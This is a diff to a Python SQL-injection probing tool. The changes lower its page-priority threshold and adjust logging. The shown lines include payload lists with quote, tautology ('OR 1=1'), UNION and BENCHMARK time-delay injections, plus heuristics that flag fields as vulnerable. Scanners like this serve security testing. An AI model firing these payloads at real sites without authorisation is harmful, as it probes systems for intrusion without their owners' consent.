@@ -16,7 +16,7 @@ from urllib.parse import urlencode
 # Configuration
 # ---------------------------------------------------------------------------
 
-PRIORITY_THRESHOLD = 30   # only probe pages with priority strictly above this
+PRIORITY_THRESHOLD = 6   # only probe pages with priority equal too or more than this
 
 SCORED_RESULTS_PATH = "scored_results.ndjson"
 OUT_PATH = "sqli_probe_results.ndjson"
@@ -52,7 +52,7 @@ COMPILED_ERROR_PATTERNS = [re.compile(p, re.IGNORECASE) for p in SQLI_ERROR_PATT
 # Payloads: (label, payload)
 ERROR_PAYLOADS = [
     ("single_quote",      "'"),
-    ("comment_dash",      "' -- "),
+    ("comment_dash",      "' --"),
     ("or_true",           "' OR '1'='1'"),
     ("or_true_comment",   "1' OR '1'='1'#"),
     ("union_null",        "' UNION SELECT NULL#"),
@@ -65,7 +65,7 @@ TIME_PAYLOADS = [
     ("benchmark",     "1' AND BENCHMARK(5000000,MD5(1))#", 2.5),
 ]
 
-TIME_PROBE_THRESHOLD = 2.0   # seconds — flag if response takes longer than this (lowered for reliability)
+TIME_PROBE_THRESHOLD = 2.0   # seconds — flag if response takes longer than this
 REQUEST_TIMEOUT = 15         # seconds
 
 
@@ -171,7 +171,7 @@ def _load_unique_forms(results_path: str) -> list[dict]:
                     priority = int(record.get("score_sqli_preprobe") or 0)
                 except (TypeError, ValueError):
                     priority = 0
-                if priority <= PRIORITY_THRESHOLD:
+                if priority < PRIORITY_THRESHOLD:
                     continue
                 # ----------------------
 
@@ -187,7 +187,7 @@ def _load_unique_forms(results_path: str) -> list[dict]:
         print(f"[SqlProber] Input file not found: {results_path}")
     except Exception as e:
         print(f"[SqlProber] Error reading {results_path}: {e}")
-
+    print(f"[SqlProber] Loaded {len(unique)} unique form(s) to probe.")
     return unique
 
 
@@ -329,14 +329,14 @@ def _probe_field(
         diff_ratio = abs(true_len - false_len) / max_len
         status_differs = results["true"]["status"] != results["false"]["status"]
 
-        # NEW: compare against baseline too
+
         true_vs_baseline = abs(true_len - baseline_len) / max(baseline_len, 1)
         false_vs_baseline = abs(false_len - baseline_len) / max(baseline_len, 1)
 
         content_differs = true_text != false_text
 
         vulnerable = (
-                diff_ratio >= 0.02  # LOWER threshold
+                diff_ratio >= 0.02
                 or status_differs
                 or content_differs  #
                 or true_vs_baseline > 0.05  #
